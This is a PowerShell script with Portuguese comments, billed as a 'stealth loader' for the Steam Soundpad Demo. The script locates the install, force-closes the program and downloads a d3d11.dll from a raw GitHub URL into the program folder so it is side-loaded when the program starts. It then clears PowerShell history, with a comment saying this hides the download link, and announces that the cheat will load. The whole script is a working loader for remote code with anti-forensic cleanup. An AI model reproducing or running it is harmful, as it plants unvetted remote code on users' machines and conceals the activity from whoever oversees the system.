# ==============================================================================
# 🎮 STEALTH LOADER - SOUNDPAD DEMO (STEAM)
# ==============================================================================

# 1. CONFIGURAÇÕES (MUDE O LINK ABAIXO)
$DllUrl = "https://raw.githubusercontent.com/enzin762/wasd/main/d3d11.dll"
$ProxyName = "d3d11.dll"

# 2. LOCALIZAR PASTA DO SOUNDPAD DEMO NA STEAM
$SoundpadPath = "C:\Program Files (x86 )\Steam\steamapps\common\Soundpad\Soundpad.exe"

if (-not (Test-Path $SoundpadPath)) {
    # Tenta buscar no registro se não estiver no caminho padrão
    $SteamPath = Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -Name "InstallPath" -ErrorAction SilentlyContinue
    if ($SteamPath) {
        $SoundpadPath = "$($SteamPath.InstallPath)\steamapps\common\Soundpad\Soundpad.exe"
    }
}

# Verifica se o Soundpad existe
if (-not (Test-Path $SoundpadPath)) {
    Write-Host "[-] Erro: Soundpad Demo não encontrado na pasta da Steam." -ForegroundColor Red
    return
}

$InstallDir = Split-Path $SoundpadPath
$DestPath = Join-Path $InstallDir $ProxyName

# 3. INSTALAÇÃO FURTIVA
Write-Host "[+] Preparando ambiente..." -ForegroundColor Cyan

# Se o Soundpad estiver aberto, ele fecha para poder colocar a DLL
$Proc = Get-Process "Soundpad" -ErrorAction SilentlyContinue
if ($Proc) {
    Stop-Process -Name "Soundpad" -Force
    Start-Sleep -Seconds 1
}

# Baixa a DLL diretamente para a pasta do jogo
try {
    Invoke-WebRequest -Uri $DllUrl -OutFile $DestPath -UseBasicParsing
    Write-Host "[+] DLL instalada com sucesso na pasta da Steam." -ForegroundColor Green
} catch {
    Write-Host "[-] Erro ao baixar a DLL. Verifique o link no GitHub." -ForegroundColor Red
    return
}

# 4. INICIAR O JOGO
Write-Host "[+] Iniciando Soundpad..." -ForegroundColor Green
Start-Process $SoundpadPath

# 5. LIMPEZA DE RASTROS DO POWERSHELL
# Remove o histórico de comandos do ISE para não verem o link do GitHub
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
Write-Host "[OK] Tudo pronto! O cheat carregará com o jogo." -ForegroundColor Cyan
